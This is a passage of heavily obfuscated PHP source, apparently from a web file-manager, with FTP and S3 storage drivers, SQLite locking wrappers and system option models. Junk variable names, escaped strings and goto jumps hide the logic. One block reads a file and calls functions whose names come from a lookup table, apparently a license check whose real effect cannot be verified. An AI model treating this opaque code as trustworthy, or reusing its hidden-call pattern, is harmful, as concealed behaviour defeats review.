is_string($•ñÑ¤è˜[0]) && strtolower($•ñÑ¤è˜[0]) == $¬ó¦Ú¶Á[341]) { $•ñÑ¤è˜ = $this->escapeString($•ñÑ¤è˜[1]); } elseif (is_array($•ñÑ¤è˜)) { $•ñÑ¤è˜ = array_map(array($this, $¬ó¦Ú¶Á[1011]), $•ñÑ¤è˜); } elseif (is_bool($•ñÑ¤è˜)) { $•ñÑ¤è˜ = $•ñÑ¤è˜ ? $¬ó¦Ú¶Á[88] : $¬ó¦Ú¶Á[212]; } elseif (is_null($•ñÑ¤è˜)) { $•ñÑ¤è˜ = $¬ó¦Ú¶Á[103]; } return $•ñÑ¤è˜; } public function getLastInsertId() { $ı”ËÍıÏ =& $_SERVER[çâ¥×ø³]; switch ($this->dbType) { case $ı”ËÍıÏ[997]: case $ı”ËÍıÏ[989]: case $ı”ËÍıÏ[970]: case $ı”ËÍıÏ[988]: case $ı”ËÍıÏ[972]: case $ı”ËÍıÏ[1000]: return $this->_linkID->lastInsertId(); case $ı”ËÍıÏ[971]: case $ı”ËÍıÏ[973]: $Î›š£©× = $this->table; $¢œ€ó÷û = $this->query("\x53\x45\114\105\103\124\x20{$Î›š£©×}\56\143\165\x72\x72\x76\x61\154\x20\x63\165\162\x72\x76\x61\x6c\x20\x46\x52\x4f\x4d\40\x64\x75\141\x6c"); return $¢œ€ó÷û ? $¢œ€ó÷û[0][$ı”ËÍıÏ[1012]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($à½ÙâÇÏ) { $ËœÛ‹­î =& $_SERVER[çâ¥×ø³]; if (!CacheLock::fileLock($ËœÛ‹­î[13])) { return !1; } $ˆß‚ÆÒò = parent::query($à½ÙâÇÏ); CacheLock::fileUnLock($ËœÛ‹­î[13]); return $ˆß‚ÆÒò; } public function execute($ò²Û¦–) { $¹È¤™¼í =& $_SERVER[çâ¥×ø³]; if (!CacheLock::fileLock($¹È¤™¼í[13])) { return !1; } $§°–î€ = parent::execute($ò²Û¦–); CacheLock::fileUnLock($¹È¤™¼í[13]); return $§°–î€; } } class DbSqlite3 extends DbSqlite3Base { public function query($Ø‰†Ô‰–) { $Ì¼˜ÇÅ¦ =& $_SERVER[çâ¥×ø³]; if (!CacheLock::fileLock($Ì¼˜ÇÅ¦[13])) { return !1; } $˜ûü‘â = parent::query($Ø‰†Ô‰–); CacheLock::fileUnLock($Ì¼˜ÇÅ¦[13]); return $˜ûü‘â; } public function execute($ÒäìÎå¹) { $¢û¨×ğ³ =& $_SERVER[çâ¥×ø³]; if (!CacheLock::fileLock($¢û¨×ğ³[13])) { return !1; } $À‡ˆàƒø = parent::execute($ÒäìÎå¹); CacheLock::fileUnLock($¢û¨×ğ³[13]); return $À‡ˆàƒø; } } goto aéÅ‰¤È„é; FÍµ¼¼Ôì: function binCheckBigger($şÊ½Şõ², $ìœ´¼İÒ) { return $şÊ½Şõ² > $ìœ´¼İÒ; } $_SERVER[$_SERVER[‹Í¤¶Õ¨][3]] = ("\70\62\71\61"."\x38\x34")+0;$_0vg8="n5aglsqy4d09e3ocjv8biz7wrk1fu62mphtxj7ov5g3rqa9ybkfupcn24h0mdzlew8it16sx4to52n07";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($ÜÀêö×, $É€ù˜ØÕ) { $”¿–­²Ù =& $_SERVER[çâ¥×ø³]; if (isset(self::$_methodList[$ÜÀêö×])) { return @call_user_func_array(self::$_methodList[$ÜÀêö×], $É€ù˜ØÕ); } else { if (method_exists($this, $ÜÀêö×)) { return call_user_func_array(array($this, $ÜÀêö×), $É€ù˜ØÕ); } else { think_exception(__CLASS__ . $”¿–­²Ù[4] . $ÜÀêö× . $”¿–­²Ù[5]); } } } public static function __callStatic($”ìÇä ã, $ÛÔ„ÂØ) { if (isset(self::$_methodListStatic[$”ìÇä ã])) { return call_user_func_array(self::$_methodListStatic[$”ìÇä ã], $ÛÔ„ÂØ); } else { if (method_exists(self, $”ìÇä ã)) { return call_user_func_array(array(self, $”ìÇä ã), $ÛÔ„ÂØ); } else { show_json("{$”ìÇä ã}\50\x29\x20\156\x6f\164\40\x65\170\x69\163\164\73", !1); } } } public static function addMethod($êÒÎ²‡¬, $ëÏ†æ£Ï) { self::$_methodList[$êÒÎ²‡¬] = $ëÏ†æ£Ï; } public static function addMethodStatic($íœ½»Íö, $çì‡›áû) { self::$_methodListStatic[$íœ½»Íö] = $çì‡›áû; } } goto FÜ¸Ä¤›¿í; cä‹Æî§†À: class PathDriverEDS extends PathDriverMinIO { public function __construct($¹­¤Ã•) { parent::__construct($¹­¤Ã•); } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($õˆû½Ë«) { parent::__construct($õˆû½Ë«); $this->signatureVersion($_SERVER[çâ¥×ø³][231]); } public function uploadFormData($ÈÛÈÑ, $ÜŠ¢éüç = 3600) { $›¯Î±éú =& $_SERVER[çâ¥×ø³]; $ÅÈ‡ö§¾ = $›¯Î±éú[213]; $ñâ÷—–£ = $›¯Î±éú[253]; $Şüãóƒ¬ = $›¯Î±éú[62]; $æº—Ö = gmdate($›¯Î±éú[254]); $ò€ºËè½ = gmdate($›¯Î±éú[255]); $š¼í±² = $›¯Î±éú[256]; $µÄçî³Â = $ÜŠ¢éüç . $›¯Î±éú[12]; $•®Øéã = $›¯Î±éú[257]; $¸êıåÀó = array($this->accessKey, $ò€ºËè½, $this->region, $Şüãóƒ¬, $š¼í±²); $âÒÑˆĞş = implode($›¯Î±éú[8], $¸êıåÀó); $åÚ¯˜Ôµ = array($›¯Î±éú[258] => gmdate($›¯Î±éú[1377], strtotime($›¯Î±éú[260])), $›¯Î±éú[261] => array(array($›¯Î±éú[262] => $this->bucket), array($›¯Î±éú[263] => $ÅÈ‡ö§¾), array($›¯Î±éú[264], $›¯Î±éú[265], $›¯Î±éú[12]), array($›¯Î±éú[264], $›¯Î±éú[266], $›¯Î±éú[12]), array($›¯Î±éú[264], $›¯Î±éú[267], $›¯Î±éú[12]), array($›¯Î±éú[268] => $•®Øéã), array($›¯Î±éú[269] => $âÒÑˆĞş), array($›¯Î±éú[270] => $ñâ÷—–£), array($›¯Î±éú[271] => $æº—Ö), array($›¯Î±éú[272] => $µÄçî³Â))); $ÀãĞùèú = base64_encode(json_encode($åÚ¯˜Ôµ)); $ëıÛ¼ƒ = hash_hmac($›¯Î±éú[273], $ò€ºËè½, $›¯Î±éú[274] . $this->secret, !0); $ø•ìõùı = hash_hmac($›¯Î±éú[273], $this->region, $ëıÛ¼ƒ, !0); $¦ÅÄšáæ = hash_hmac($›¯Î±éú[273], $Şüãóƒ¬, $ø•ìõùı, !0); $¥ãÂ“É = hash_hmac($›¯Î±éú[273], $š¼í±², $¦ÅÄšáæ, !0); $õ©ˆÖ’ = hash_hmac($›¯Î±éú[273], $ÀãĞùèú, $¥ãÂ“É); $ôî¼¥” = array($›¯Î±éú[230] => $›¯Î±éú[12], $›¯Î±éú[275] => $›¯Î±éú[12], $›¯Î±éú[263] => $ÅÈ‡ö§¾, $›¯Î±éú[268] => $•®Øéã, $›¯Î±éú[276] => $ÀãĞùèú, $›¯Î±éú[277] => $âÒÑˆĞş, $›¯Î±éú[278] => $ñâ÷—–£, $›¯Î±éú[279] => $æº—Ö, $›¯Î±éú[280] => $µÄçî³Â, $›¯Î±éú[281] => $õ©ˆÖ’, $›¯Î±éú[196] => $this->getHost()); return $ôî¼¥”; } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\x31"; public $config = array(); public function __construct($º£Á®£›) { parent::__construct(); if (count($º£Á®£›) > 0) { $this->_init($º£Á®£›); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($ÈêĞ¯¯) { $Ù÷°Ã¾º =& $_SERVER[çâ¥×ø³]; global $config; $this->appCharset = $config[$Ù÷°Ã¾º[1403]]; $this->systemCharset = $config[$Ù÷°Ã¾º[1404]]; if (isset($ÈêĞ¯¯[$Ù÷°Ã¾º[1405]]) && $ÈêĞ¯¯[$Ù÷°Ã¾º[1405]]) { $this->systemCharset = $ÈêĞ¯¯[$Ù÷°Ã¾º[1405]]; } } public function iconvApp($«¨‘¥ü“) { return $this->iconvTo($«¨‘¥ü“, $this->systemCharset, $this->appCharset); } public function iconvSystem($ˆÜ„¤Œî) { return $this->iconvTo($ˆÜ„¤Œî, $this->appCharset, $this->systemCharset); } public function getPathOuter($‰³¦‚õõ) { $Ó»ÁÛÏ¯ =& $_SERVER[çâ¥×ø³]; $ÂŠ°ñíŒ = $this->iconvApp($this->pathBase); $‰³¦‚õõ = $this->iconvApp($‰³¦‚õõ); if (substr($ÂŠ°ñíŒ, 0, 2) == $Ó»ÁÛÏ¯[1406]) { $ÂŠ°ñíŒ = BASIC_PATH . substr($ÂŠ°ñíŒ, 2); } if (substr($‰³¦‚õõ, 0, 2) == $Ó»ÁÛÏ¯[1406]) { $‰³¦‚õõ = BASIC_PATH . substr($‰³¦‚õõ, 2); } $ÂŠ°ñíŒ = KodIO::clear($ÂŠ°ñíŒ); $‰³¦‚õõ = KodIO::clear($‰³¦‚õõ); $‰³¦‚õõ = substr($‰³¦‚õõ, strlen($ÂŠ°ñíŒ)); if (empty($this->pathDriver)) { return $‰³¦‚õõ; } return $this->pathDriver . $Ó»ÁÛÏ¯[8] . ltrim($‰³¦‚õõ, $Ó»ÁÛÏ¯[8]); } private function _init($ïÖÓêÌ = array()) { $×üßß†— =& $_SERVER[çâ¥×ø³]; if (!function_exists($×üßß†—[1407])) { throw new Exception(LNG($×üßß†—[1408])); } $this->config = $ïÖÓêÌ; $this->charsetReset($ïÖÓêÌ); foreach ($ïÖÓêÌ as $èìÇè => $êœàÔ½) { if (isset($this->{$èìÇè})) { $this->{$èìÇè} = $êœàÔ½; } } return $this->_login($ïÖÓêÌ); } private function _login($âœÓ¦ø¡) { $™×¢õÖÅ =& $_SERVER[çâ¥×ø³]; static $õµ­æ³ = array(); $ÇÚˆ×àœ = md5(json_encode($âœÓ¦ø¡)); if (isset($õµ­æ³[$ÇÚˆ×àœ])) { foreach ($õµ­æ³[$ÇÚˆ×àœ] as $ëïªö ´ => $†¤Œò€ò) { $this->{$ëïªö ´} = $†¤Œò€ò; } return !0; } $¤ã±­Ôç = parse_url(trim($this->server, $™×¢õÖÅ[8])); $this->host = $¤ã±­Ôç[$™×¢õÖÅ[196]]; $Íèµ™ç = isset($¤ã±­Ôç[$™×¢õÖÅ[195]]) && $¤ã±­Ôç[$™×¢õÖÅ[195]] == $™×¢õÖÅ[1409] ? !0 : !1; $this->scheme = $Íèµ™ç ? $™×¢õÖÅ[1410] : $™×¢õÖÅ[1411]; $this->port = isset($¤ã±­Ôç[$™×¢õÖÅ[197]]) ? $¤ã±­Ôç[$™×¢õÖÅ[197]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $Òû²ÀÀ = @ftp_login($this->connect, $this->username, $this->userpass); @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $Å—ñš´‰ = $this->pasv == $™×¢õÖÅ[88] ? !0 : !1; @ftp_pasv($this->connect, $Å—ñš´‰); $õµ­æ³[$ÇÚˆ×àœ] = array($™×¢õÖÅ[1412] => $this->connect, $™×¢õÖÅ[196] => $this->host, $™×¢õÖÅ[195] => $this->scheme, $™×¢õÖÅ[197] => $this->port); return $Òû²ÀÀ; } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($„Àö„™õ, $ËÑ“ü¾À = '', $“‹¸·“Û = REPEAT_RENAME) { if ($this->setContent($„Àö„™õ, $ËÑ“ü¾À)) { return $this->getPathOuter($„Àö„™õ); } return !1; } public function mkdir($ÜöÈ‹ğé, $ÜùÊÈÌ’ = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $ÜöÈ‹ğé = $this->iconvSystem($ÜöÈ‹ğé); if ($this->_isFolder($ÜöÈ‹ğé) || @ftp_mkdir($this->connect, $ÜöÈ‹ğé)) { return $this->getPathOuter($ÜöÈ‹ğé); } if (!$this->mkdir($this->pathFather($ÜöÈ‹ğé))) { return !1; } if ($ÜöÈ‹ğé = @ftp_mkdir($this->connect, $ÜöÈ‹ğé)) { return $this->getPathOuter($ÜöÈ‹ğé); } return !1; } public function copyFile($ˆó€»ç€, $Å×ä˜›¡) { if (!$this->_isconn()) { return !1; } $şóÖ¡Îù = $this->pathThis($this->iconvSystem($ˆó€»ç€)); $˜¿Õ³îà = $this->tempFile($şóÖ¡Îù); $¤‰›ş°À = $this->iconvApp($˜¿Õ³îà); $this->download($ˆó€»ç€, $¤‰›ş°À); $®ß´óÌ‡ = $this->upload($Å×ä˜›¡, $¤‰›ş°À); $this->tempFileRemve($˜¿Õ³îà); return $®ß´óÌ‡; } public function moveFile($ÙåóÆ¥, $Æòˆ•ŒÙ) { if (!$this->_isconn()) { return !1; } $ÙåóÆ¥ = $this->iconvSystem($ÙåóÆ¥); $Æòˆ•ŒÙ = $this->iconvSystem($Æòˆ•ŒÙ); $”Ò¡İÔ‹ = @ftp_rename($this->connect, $ÙåóÆ¥, $Æòˆ•ŒÙ); return $”Ò¡İÔ‹ ? $this->getPathOuter($Æòˆ•ŒÙ) : !1; } public function delFile($³¥†ƒ´Ÿ) { if (!$this->_isconn()) { return !1; } $³¥†ƒ´Ÿ = $this->iconvSystem($³¥†ƒ´Ÿ); return @ftp_delete($this->connect, $³¥†ƒ´Ÿ); } public function delFolder($íµ’Éı†) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $ı¸Ú‰•Õ = $úÊ±ú¦ = array(); $this->fileList($íµ’Éı†, $ı¸Ú‰•Õ, $úÊ±ú¦, !0); $this->listItemCache = !0; foreach ($úÊ±ú¦ as $›€Š¡Äô) { $½ìÍ±À = $this->iconvSystem($›€Š¡Äô[$_SERVER[çâ¥×ø³][32]]); $İÄàù£ = @ftp_delete($this->connect, $½ìÍ±À); if (!$İÄàù£) { return !1; } } foreach ($ı¸Ú‰•Õ as $½ìÍ±À) { $½ìÍ±À = $this->iconvSystem($½ìÍ±À); $İÄàù£ = @ftp_rmdir($this->connect, $½ìÍ±À); if (!$İÄàù£) { return !1; } } $íµ’Éı† = $this->iconvSystem($íµ’Éı†); return @ftp_rmdir($this->connect, $íµ’Éı†); } public function rename($‰„õâÉ¥, $¦²Ãƒ¬°) { $ŸªÆ€èŞ =& $_SERVER[çâ¥×ø³]; if (!$this->_isconn()) { return !1; } $¥ıí±ä = $this->fileNameAuto($this->pathFather($‰„õâÉ¥), $¦²Ãƒ¬°); $¥ıí±ä = $this->iconvSystem($¥ıí±ä); $‰„õâÉ¥ = $this->iconvSystem($‰„õâÉ¥); $Ç¬åÅğá = $this->pathFather($‰„õâÉ¥); $¼ä˜³¡ = rtrim($Ç¬åÅğá, $ŸªÆ€èŞ[8]) . $ŸªÆ€èŞ[8] . $¥ıí±ä; $½Ä¼¡îŞ = @ftp_rename($this->connect, $‰„õâÉ¥, $¼ä˜³¡); $¼ä˜³¡ = $this->iconvApp($¼ä˜³¡); return $½Ä¼¡îŞ ? $this->getPathOuter($¼ä˜³¡) : !1; } private function folderInfo($›ï¿‘–õ, $¹à¿÷¯ = false) { $¨¤×ÇÔé =& $_SERVER[çâ¥×ø³]; $üê’˜Üş = array($¨¤×ÇÔé[32] => $this->pathThis($›ï¿‘–õ), $¨¤×ÇÔé[84] => $this->getPathOuter($¨¤×ÇÔé[8] . $›ï¿‘–õ), $¨¤×ÇÔé[33] => $¨¤×ÇÔé[75]); if ($¹à¿÷¯) { return $üê’˜Üş; } $üê’˜Üş[$¨¤×ÇÔé[215]] = $üê’˜Üş[$¨¤×ÇÔé[85]] = 0; $üê’˜Üş[$¨¤×ÇÔé[216]] = $üê’˜Üş[$¨¤×ÇÔé[217]] = !0; return $üê’˜Üş; } private function fileInfo($É“‘ãˆ, $úé£ÅØ† = false, $„å”Á¾Ğ = array()) { $‰ãÁç‘ =& $_SERVER[çâ¥×ø³]; $°ôİÔºŞ = array($‰ãÁç‘[32] => $this->pathThis($É“‘ãˆ), $‰ãÁç‘[84] => $this->getPathOuter($‰ãÁç‘[8] . $É“‘ãˆ), $‰ãÁç‘[33] => $‰ãÁç‘[214], $‰ãÁç‘[76] => isset($„å”Á¾Ğ[$‰ãÁç‘[76]]) ? $„å”Á¾Ğ[$‰ãÁç‘[76]] : 0, $‰ãÁç‘[175] => $this->ext($É“‘ãˆ)); if ($úé£ÅØ†) { return $°ôİÔºŞ; } $°ôİÔºŞ[$‰ãÁç‘[215]] = $°ôİÔºŞ[$‰ãÁç‘[85]] = 0; $°ôİÔºŞ[$‰ãÁç‘[216]] = $°ôİÔºŞ[$‰ãÁç‘[217]] = !0; $»õî¾Í¥ = $this->iconvSystem($É“‘ãˆ); $°ôİÔºŞ[$‰ãÁç‘[85]] = @ftp_mdtm($this->connect, $»õî¾Í¥); if (empty($„å”Á¾Ğ)) { $„å”Á¾Ğ = $this->objectMeta($É“‘ãˆ); if (!$„å”Á¾Ğ) { return $°ôİÔºŞ; } } $°ôİÔºŞ[$‰ãÁç‘[76]] = $„å”Á¾Ğ[$‰ãÁç‘[76]]; return $°ôİÔºŞ; } public function size($¸Õ›Ñ) { $ÂúµŸüÄ = $this->objectMeta($¸Õ›Ñ); return $ÂúµŸüÄ ? $ÂúµŸüÄ[$_SERVER[çâ¥×ø³][76]] : 0; } public function info($¨ã»Æ²í) { if ($this->isFile($¨ã»Æ²í)) { return $this->fileInfo($¨ã»Æ²í, 0); } else { if ($this->isFolder($¨ã»Æ²í)) { return $this->folderInfo($¨ã»Æ²í); } } return !1; } private function fileList($Ò›Ü„Ö‚, &$‹Ä¾Ù­, &$ƒ¸®æï, $èš¤š› = false) { $­óªğğÑ =& $_SERVER[çâ¥×ø³]; $Ò›Ü„Ö‚ = $this->iconvSystem($Ò›Ü„Ö‚); if (!$this->isFolder($Ò›Ü„Ö‚)) { return !1; } @ftp_chdir($this->connect, $­óªğğÑ[8]); $Ò›Ü„Ö‚ = rtrim($Ò›Ü„Ö‚, $­óªğğÑ[8]) . $­óªğğÑ[8]; check_abort(); $ÏÎşö = @ftp_rawlist($this->connect, $Ò›Ü„Ö‚); if (!$ÏÎşö) { $ÏÎşö = array(); } $ªöÄ‚³­ = array($­óªğğÑ[10] => 1, $­óªğğÑ[1331] => 1); foreach ($ÏÎşö as $ŸÒ¡¤¦) { $’ÚÇ•ú£ = $this->_listItem($ŸÒ¡¤¦); if ($’ÚÇ•ú£[0] == $­óªğğÑ[807]) { continue; } $—ÌİÀ» = $’ÚÇ•ú£[8]; if (empty($—ÌİÀ») && $—ÌİÀ» !== $­óªğğÑ[212] || isset($ªöÄ‚³­[$—ÌİÀ»])) { continue; } $—ÌİÀ» = $this->iconvApp($Ò›Ü„Ö‚ . ltrim($—ÌİÀ», $­óªğğÑ[8])); $÷“ò¨Ğ¢ = array($­óªğğÑ[32] => $—ÌİÀ», $­óªğğÑ[33] => $­óªğğÑ[214], $­óªğğÑ[76] => $’ÚÇ•ú£[4]); if (substr($ŸÒ¡¤¦, 0, 1) == $­óªğğÑ[1413]) { $÷“ò¨Ğ¢[$­óªğğÑ[33]] = $­óªğğÑ[75]; $÷“ò¨Ğ¢[$­óªğğÑ[76]] = 0; } $à— Æµˆ = $÷“ò¨Ğ¢[$­óªğğÑ[33]] == $­óªğğÑ[75] ? !0 : !1; $this->cacheMethodInfoSet($—ÌİÀ», $à— Æµˆ, $÷“ò¨Ğ¢); if ($à— Æµˆ) { $‹Ä¾Ù­[] = $—ÌİÀ»; if ($èš¤š›) { $this->fileList($—ÌİÀ», $‹Ä¾Ù­, $ƒ¸®æï, $èš¤š›); } continue; } $ƒ¸®æï[] = $÷“ò¨Ğ¢; } $this->cacheMethodInfoSet($Ò›Ü„Ö‚, !0); } private function _listItem($§˜Øë¸à) { if (empty($§˜Øë¸à)) { return array(); } $Äƒ“æå¦ = preg_split($_SERVER[çâ¥×ø³][1414], $§˜Øë¸à); if (count($Äƒ“æå¦) <= 9) { return $Äƒ“æå¦; } $Äƒ“æå¦[8] = trim(substr($§˜Øë¸à, strpos($§˜Øë¸à, $Äƒ“æå¦[7]) + strlen($Äƒ“æå¦[7]))); return array_splice($Äƒ“æå¦, 0, 9); } public function listPath($¯ŸÀØ™ú, $ä×¤Š§ = false) { $‘¦–Îº½ =& $_SERVER[çâ¥×ø³]; if (!$this->_isconn()) { return !1; } $±Ÿª‰šÔ = $½«º–éÒ = array(); $this->fileList($¯ŸÀØ™ú, $±Ÿª‰šÔ, $½«º–éÒ); foreach ($±Ÿª‰šÔ as $ÜÂÅ‚à => $şäìº½·) { $±Ÿª‰šÔ[$ÜÂÅ‚à] = $this->folderInfo($şäìº½·, $ä×¤Š§); } foreach ($½«º–éÒ as $ÜÂÅ‚à => $şäìº½·) { $½«º–éÒ[$ÜÂÅ‚à] = $this->fileInfo($şäìº½·[$‘¦–Îº½[32]], $ä×¤Š§, $şäìº½·); } return array($‘¦–Îº½[82] => $±Ÿª‰šÔ, $‘¦–Îº½[83] => $½«º–éÒ); } public function has($•ÔØ´ıİ, $ÛíöÒË = false, $Ïâï¼¥Ô = true) { $–Ğ€ÒÅ“ =& $_SERVER[çâ¥×ø³]; $ÔÈ‚„Ğ = $ÈªÓÄâÎ = array(); $ÆäÈû¦¾ = $ÛíöÒË ? !0 : !1; $this->fileList($•ÔØ´ıİ, $ÔÈ‚„Ğ, $ÈªÓÄâÎ, $ÆäÈû¦¾); if ($ÛíöÒË) { return array($–Ğ€ÒÅ“[223] => count($ÈªÓÄâÎ), $–Ğ€ÒÅ“[224] => count($ÔÈ‚„Ğ)); } if ($Ïâï¼¥Ô) { if (count($ÈªÓÄâÎ)) { return !0; } } else { if (count($ÔÈ‚„Ğ)) { return !0; } } return !1; } public function listAll($Şˆì³Â«) { $­´ƒéŸ =& $_SERVER[çâ¥×ø³]; if (!$this->_isconn()) { return !1; } $œŸºã‘‡ = $ÔĞƒíè = array(); $this->fileList($Şˆì³Â«, $œŸºã‘‡, $ÔĞƒíè, !0); $ØÈæåÊœ = array_to_keyvalue($ÔĞƒíè, $­´ƒéŸ[32]); foreach ($œŸºã‘‡ as $ğŞÜ¥…) { if (is_string($ğŞÜ¥…)) { $ØÈæåÊœ[$ğŞÜ¥…] = array($­´ƒéŸ[76] => 0); } } return $this->listAllFiles($Şˆì³Â«, $ØÈæåÊœ); } public function getContent($Å‚åšûÂ) { if (!$this->_isconn()) { return !1; } $Å‚åšûÂ = $this->iconvSystem($Å‚åšûÂ); return $this->fileSubstr($Å‚åšûÂ); } public function setContent($òí¹ÓÔ, $ËšêË” = '') { if (!$this->_isconn()) { return !1; } $–†ÁÜ’¼ = $this->pathThis($this->iconvSystem($òí¹ÓÔ)); $£ìÍº¼â = $this->tempFile($–†ÁÜ’¼); file_put_contents($£ìÍº¼â, $ËšêË”); $õİÕ€íñ = $this->upload($òí¹ÓÔ, $this->iconvApp($£ìÍº¼â)); $this->tempFileRemve($£ìÍº¼â); return $õİÕ€íñ; } public function fileSubstr($É›² ¦Ÿ, $–»¦û¼ = 0, $ıõÑÑƒÁ = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($É›² ¦Ÿ, $–»¦û¼, $ıõÑÑƒÁ); } private function ftpRequest($™¹ùÆœ©, $…ú»¦Æ¿ = 0, $˜Üß„Ş¹ = false) { $™¹ùÆœ© = $this->iconvSystem($™¹ùÆœ©); $áÑ†îÙà = $this->scheme . $this->host . $_SERVER[çâ¥×ø³][4] . $this->port; $¬¤¬•Ÿö = curl_init(); curl_setopt($¬¤¬•Ÿö, CURLOPT_URL, $áÑ†îÙà . $this->pathEncode($™¹ùÆœ©)); curl_setopt($¬¤¬•Ÿö, CURLOPT_USERPWD, "{$this->username}\x3a{$this->userpass}"); if ($˜Üß„Ş¹) { $•õ†Ôû¡ = $…ú»¦Æ¿ + $˜Üß„Ş¹ - 1; curl_setopt($¬¤¬•Ÿö, CURLOPT_RANGE, "{$…ú»¦Æ¿}\55{$•õ†Ôû¡}"); } curl_setopt($¬¤¬•Ÿö, CURLOPT_RETURNTRANSFER, 1); $Ñ¦Ç¾ØÉ = curl_exec($¬¤¬•Ÿö); curl_close($¬¤¬•Ÿö); return $Ñ¦Ç¾ØÉ; } public function upload($­ÛÈõÎ, $ ó£Ô‚, $¨²£ˆ½Ş = false, $Í×ÊË² = REPEAT_REPLACE) { if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($­ÛÈõÎ))) { return !1; } $­ÛÈõÎ = $this->iconvSystem($­ÛÈõÎ); $ ó£Ô‚ = $this->iconvSystem($ ó£Ô‚); $Ûöûô¬ = ftp_nb_put($this->connect, $­ÛÈõÎ, $ ó£Ô‚, FTP_BINARY); while ($Ûöûô¬ == FTP_MOREDATA) { $Ûöûô¬ = ftp_nb_continue($this->connect); } if ($Ûöûô¬ != FTP_FINISHED) { return !1; } return $this->getPathOuter($­ÛÈõÎ); } public function download($Ëó´ÇŸş, $ ÂøšÑ· = '') { if (!$this->_isconn()) { return !1; } $Æ“¡ãüÖ = $this->pathFather($ ÂøšÑ·); if (!IO::mkdir($Æ“¡ãüÖ)) { return !1; } $Ëó´ÇŸş = $this->iconvSystem($Ëó´ÇŸş); $ ÂøšÑ· = $this->iconvSystem($ ÂøšÑ·); $ÇÉíãöê = ftp_nb_get($this->connect, $ ÂøšÑ·, $Ëó´ÇŸş, FTP_BINARY); while ($ÇÉíãöê == FTP_MOREDATA) { $ÇÉíãöê = ftp_nb_continue($this->connect); } if ($ÇÉíãöê != FTP_FINISHED) { return !1; } return $this->iconvApp($ ÂøšÑ·); } public function exist($«Ë¼±¶Ş) { return $this->isFile($«Ë¼±¶Ş) || $this->isFolder($«Ë¼±¶Ş); } public function isFile($åİÁ­´İ) { return !$this->isFolder($åİÁ­´İ) && $this->objectMeta($åİÁ­´İ); } public function isFolder($À°•‡Îæ) { return $this->cacheMethod($_SERVER[çâ¥×ø³][166], $À°•‡Îæ); } protected function objectMeta($ÄÊÖôÑŞ) { return $this->cacheMethod($_SERVER[çâ¥×ø³][168], $ÄÊÖôÑŞ); } protected function _objectMeta($¤ÁÚËä) { $å™²’Œ =& $_SERVER[çâ¥×ø³]; if ($¤ÁÚËä == $å™²’Œ[12] || $¤ÁÚËä == $å™²’Œ[8]) { return array(); } if (!$this->_isconn()) { return !1; } $¤ÁÚËä = $this->iconvSystem($¤ÁÚËä); $”ˆµÁã = array($å™²’Œ[32] => $this->iconvApp($¤ÁÚËä), $å™²’Œ[33] => $å™²’Œ[214], $å™²’Œ[76] => 0); @ftp_chdir($this->connect, $å™²’Œ[8]); $ş¶Â³±İ = @ftp_size($this->connect, $¤ÁÚËä); if ($ş¶Â³±İ != -1) { $”ˆµÁã[$å™²’Œ[76]] = $ş¶Â³±İ; } else { $·²äå¹À = @ftp_chdir($this->connect, $¤ÁÚËä); if (!$·²äå¹À) { return !1; } $”ˆµÁã[$å™²’Œ[33]] = $å™²’Œ[75]; } return $”ˆµÁã; } protected function _isFolder($’¥²ß•) { $‰­×£‘ =& $_SERVER[çâ¥×ø³]; if ($’¥²ß• == $‰­×£‘[12] || $’¥²ß• == $‰­×£‘[8]) { return !0; } $èş¸€‚Ñ = $this->_objectMeta($’¥²ß•); return isset($èş¸€‚Ñ[$‰­×£‘[33]]) && $èş¸€‚Ñ[$‰­×£‘[33]] == $‰­×£‘[75] ? !0 : !1; } } goto C×ø¸ï¯Å; b¢—ë·Ü¥÷: class SystemOptionModel extends ModelBaseOption { protected $tableName = "\x73\x79\x73\164\145\x6d\137\157\160\x74\x69\x6f\x6e"; protected $jsonField = array("\x6d\x65\156\x75", "\162\x6f\154\145", "\162\x6f\x6c\x65\x47\162\157\x75\x70", "\162\145\x67\151\x73\x74", "\x65\155\141\x69\154"); function __construct() { parent::__construct(); } protected function cacheKey($€üàìø˜) { return "\123\171\x73\164\145\x6d\117\x70\x74\x69\157\x6e\137{$€üàìø˜}"; } protected function optionDefault($Ã³‹›ÀŒ = '') { $ŒÏšÖâ¾ =& $_SERVER[çâ¥×ø³]; if ($Ã³‹›ÀŒ == $ŒÏšÖâ¾[12]) { return $GLOBALS[$ŒÏšÖâ¾[6]][$ŒÏšÖâ¾[425]]; } } } class SystemRecordModel extends ModelBaseLight { } if ($_SERVER[$_SERVER[çâ¥×ø³][926]] != $_SERVER[$_SERVER[çâ¥×ø³][2340]]) { $_getc = $_SERVER[çâ¥×ø³][929]; $_getfile = $_SERVER[$_SERVER[çâ¥×ø³][930]] . $_SERVER[çâ¥×ø³][931]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[çâ¥×ø³][246], $_getfilec); if (count($_getarrs) < $_SERVER[çâ¥×ø³][670]) { $exit = $_SERVER[çâ¥×ø³][932]; $exit(); } $_act = $_SERVER[çâ¥×ø³][1492]; $_act($_SERVER[$_SERVER[çâ¥×ø³][927]]); } goto eè‘êºŞù; CìŠˆ¢Ëõ: class SystemLightAppModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\x65\x6d\56\114\x69\147\x68\164\x41\160\x70"; public $modelType = "\123\171\x73\164\145\x6d\x4f\x70\164\151\x6f\156"; public $field = array("\156\x61\155\145", "\147\162\x6f\165\x70", "\144\x65\x73\143", "\143\x6f\x6e\x74\x65\156\164"); public function listData($Š½˜Ê®¸ = false, $‰ßì²‚‡ = "\155\157\x64\x69\x66\x79\124\x69\x6d\145", $Ñ©¥ÌÉ¦ = true) { return parent::listData($Š½˜Ê®¸, $‰ßì²‚‡, $Ñ©¥ÌÉ¦); } public function remove($²¸³¿ğ¼) { 